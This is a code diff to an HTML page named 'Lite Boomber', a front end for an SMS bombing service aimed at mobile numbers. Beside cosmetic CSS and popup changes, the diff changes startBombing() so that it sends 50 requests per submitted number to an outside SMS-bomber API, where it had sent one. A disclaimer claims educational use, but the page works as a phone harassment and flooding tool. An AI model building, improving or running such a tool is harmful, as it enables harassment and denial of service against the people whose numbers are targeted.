@@ -4,27 +4,83 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Lite Boomber</title>
-  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: white;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      margin-top: 60px;
+    }
+    .box {
+      background-color: #1f1f24;
+      padding: 20px;
+      border-radius: 12px;
+      display: inline-block;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 250px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .hint {
+      color: gray;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    /* Custom popup */
+    .popup {
+      position: fixed;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #222;
+      color: white;
+      padding: 16px 25px;
+      border-radius: 10px;
+      font-size: 16px;
+      z-index: 1000;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h1 class="title">Lite<br>Boomber</h1>
-    
+
     <div class="box">
       <input type="text" id="number" placeholder="Enter Mobile e.g. 030000XXXXX" />
+      <br><br>
       <button onclick="startBombing()">Bomb 💣</button>
       <p class="hint">Enter number like: 030000XXXXX</p>
     </div>
 
-    <div class="disclaimer">
+    <div class="disclaimer" style="margin-top: 40px;">
       🚨 <strong>Disclaimer</strong><br>
       This app is for educational and verification purposes only.<br>
       We do not promote illegal use of data.
     </div>
   </div>
 
-  <!-- Contact Section Start -->
-  <div style="background-color: #1f1f24; color: white; padding: 20px; border-radius: 16px; width: fit-content; margin: 40px auto 20px auto; text-align: center;">
+  <!-- Contact Section -->
+  <div style="background-color: #1f1f24; color: white; padding: 20px; border-radius: 16px; width: fit-content; margin: 40px auto; text-align: center;">
     <h3 style="font-weight: bold;">Contact Us</h3>
     <p>
       <a href="https://wa.me/447354208303?text=hello%20🤗" style="color: white; text-decoration: none;">
@@ -39,27 +95,36 @@
   <p style="text-align: center; color: gray; margin-top: 20px;">
     © 2025 RAZA. All rights reserved.
   </p>
-  <!-- Contact Section End -->
 
   <script>
+    function showPopup(message) {
+      const popup = document.createElement('div');
+      popup.classList.add('popup');
+      popup.innerText = message;
+      document.body.appendChild(popup);
+      setTimeout(() => popup.remove(), 2000); // 2 second popup
+    }
+
     function startBombing() {
-      const number = document.getElementById('number').value;
+      const number = document.getElementById('number').value.trim();
       if (!number || number.length < 10) {
-        alert("Please enter a valid number");
+        showPopup("⚠️ Please enter a valid number");
         return;
       }
 
       const fullNumber = number.startsWith("92") ? number : "92" + number.slice(1);
-      
-      fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${fullNumber}`)
-        .then(res => {
-          if (res.ok) {
-            alert("🔥 Bombing request sent!");
-          } else {
-            alert("❌ Failed to send. Try again.");
-          }
-        })
-        .catch(() => alert("🚫 Error occurred. Check connection or number."));
+
+      // 🔁 Send 50 background requests
+      for (let i = 1; i <= 50; i++) {
+        fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${fullNumber}`)
+          .then(res => {
+            if (!res.ok) console.warn(`Request ${i} failed`);
+          })
+          .catch(() => console.error(`Request ${i} error`));
+      }
+
+      // Show instant confirmation popup
+      showPopup("🔥 Bombing request sent x50!");
     }
   </script>
 </body>
